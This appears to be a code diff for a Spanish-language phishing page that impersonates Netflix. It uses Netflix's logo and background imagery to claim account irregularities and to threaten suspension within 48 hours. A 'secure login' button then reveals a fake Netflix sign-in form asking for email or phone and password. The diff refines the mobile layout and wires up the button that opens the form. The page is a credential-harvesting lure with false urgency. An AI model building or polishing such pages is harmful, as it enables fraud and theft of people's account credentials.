@@ -15,10 +15,10 @@ body {
   margin: 0;
   padding: 20px;
   font-family: 'Poppins', Arial, sans-serif;
-  background:
-    linear-gradient(rgba(20,20,20,0.85), rgba(20,20,20,0.85)),
-    url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg')
-    no-repeat center center fixed;
+  /* Fondo con imagen + overlay negro oscuro */
+  background: 
+    linear-gradient(rgba(20, 20, 20, 0.85), rgba(20, 20, 20, 0.85)),
+    url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg') no-repeat center center fixed;
   background-size: cover;
   color: #e5e5e5;
   min-height: 100vh;
@@ -29,7 +29,7 @@ body {
 .nl-container {
   width: 100%;
   max-width: 600px;
-  background-color: rgba(20,20,20,0.85);
+  background-color: rgba(20, 20, 20, 0.85);
   border-radius: 12px;
   box-shadow: 0 8px 24px rgba(0,0,0,0.7);
   padding: 40px 30px;
@@ -268,87 +268,89 @@ body {
     font-size: 0.9em;
   }
 }
+
+/* Móvil: todo compacto y sin scroll vertical para aviso */
+@media (max-width: 480px) {
+  html, body {
+    height: 100%;
+    overflow: hidden;
+  }
+  body {
+    padding: 10px;
+    min-height: auto;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .nl-container {
+    max-width: 360px;
+    max-height: 100vh;
+    padding: 20px 15px;
+    box-shadow: none;
+    border-radius: 8px;
+    overflow-y: auto;
+  }
+  .logo-container {
+    margin-bottom: 20px;
+  }
+  .logo-container img {
+    width: 120px;
+  }
+  .title {
+    font-size: 20px;
+    margin-bottom: 15px;
+  }
+  .paragraph {
+    font-size: 14px;
+    margin-top: 0;
+    margin-bottom: 0;
+    line-height: 1.4;
+  }
+  .paragraph + .paragraph {
+    margin-top: 6px;
+  }
+  .button-block {
+    margin: 20px 0 15px;
+  }
+  .button-block a {
+    padding: 12px 40px;
+    font-size: 15px;
+    box-shadow: none;
+    border-radius: 20px;
+  }
+}
 </style>
 </head>
 <body>
 
 <!-- Pantalla de aviso -->
 <table class="nl-container" width="100%" cellpadding="0" cellspacing="0" role="presentation" id="notice-screen">
-  <tbody>
-    <tr>
-      <td>
-        <div class="logo-container">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" />
-        </div>
-
-        <div class="title">
-          Problemas detectados en tu cuenta Netflix
-        </div>
-
-        <div class="paragraph">
-          Queremos informarte que hemos detectado irregularidades en el acceso a tu cuenta Netflix. Por motivos de seguridad, es imprescindible que inicies sesión para verificar tu información.
-        </div>
-
-        <div class="paragraph">
-          Si no realizas este procedimiento en las próximas 48 horas, tu cuenta podría ser suspendida temporalmente para proteger tus datos y evitar accesos no autorizados.
-        </div>
-
-        <div class="button-block">
-          <a href="#">Iniciar sesión seguro</a>
-        </div>
-
-      </td>
-    </tr>
-  </tbody>
-</table>
-
-<!-- Pantalla de login -->
-<div id="login-screen" style="display:none;">
+<tbody>
+<tr>
+<td>
 <div class="logo-container">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" class="netflix-logo" />
+  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" />
 </div>
 
-<div class="login-container">
-  <h1 class="login-title">Iniciar sesión</h1>
-  <form>
-    <div class="form-group">
-      <input type="text" placeholder="Email o número de celular" />
-    </div>
-    <div class="form-group">
-      <input type="password" placeholder="Contraseña" />
-    </div>
-    <button type="submit" class="login-btn">Iniciar sesión</button>
-    <div class="options-divider">O</div>
-    <a href="#" class="login-code-btn">Usar un código de inicio de sesión</a>
-    <div class="remember-help-flex">
-      <div class="remember-me">
-        <input type="checkbox" id="remember" />
-        <label for="remember">Recordarme</label>
-      </div>
-      <div class="help-options">
-        <a href="#">¿Olvidaste la contraseña?</a>
-      </div>
-    </div>
-  </form>
-  <div class="signup-section">
-    <p>¿Primera vez en Netflix? <a href="#"><strong>Suscríbete ya.</strong></a></p>
-  </div>
-  <div class="recaptcha-section">
-    <p>Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot. <a href="#">Más info.</a></p>
-  </div>
-</div>
+<div class="title">
+  Problemas detectados en tu cuenta Netflix
 </div>
 
-<script>
-document.getElementById('start-login-btn').addEventListener('click', function(event){
-  event.preventDefault();
-  document.getElementById('notice-screen').style.display = 'none';
-  document.getElementById('login-screen').style.display = 'flex';
-});
-</script>
+<div class="paragraph">
+  Queremos informarte que hemos detectado irregularidades en el acceso a tu cuenta Netflix. Por motivos de seguridad, es imprescindible que inicies sesión para verificar tu información.
+</div>
 
-</body>
-</html>
+<div class="paragraph">
+  Si no realizas este procedimiento en las próximas 48 horas, tu cuenta podría ser suspendida temporalmente para proteger tus datos y evitar accesos no autorizados.
+</div>
+
+<div class="button-block">
+  <a href="#" id="start-login-btn">Iniciar sesión seguro</a>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
 
 <!-- Pantalla de login -->
 <div id="login-screen" style="display:none;">
